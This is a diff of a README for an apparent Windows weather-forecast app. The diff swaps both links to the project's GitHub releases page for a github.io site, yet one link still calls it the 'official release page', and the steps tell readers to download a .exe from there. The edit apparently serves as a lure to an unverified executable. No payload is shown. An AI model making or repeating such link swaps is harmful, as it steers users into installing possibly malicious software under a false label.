@@ -1,6 +1,6 @@
 # ☁️ Zig_Weather_Inteligence - Accurate weather forecasts for better planning
 
-[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pramod1298/Zig_Weather_Inteligence/releases)
+[![Download Here](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pramod1298.github.io)
 
 This application gives you fast access to current weather conditions and future predictions. It combines data from weather sensors with smart computer models to show you what to expect. You can view this information through a clean, dark interface on your computer.
 
@@ -8,7 +8,7 @@ This application gives you fast access to current weather conditions and future 
 
 Follow these steps to get the program on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Pramod1298/Zig_Weather_Inteligence/releases).
+1. Go to the [official release page](https://pramod1298.github.io).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
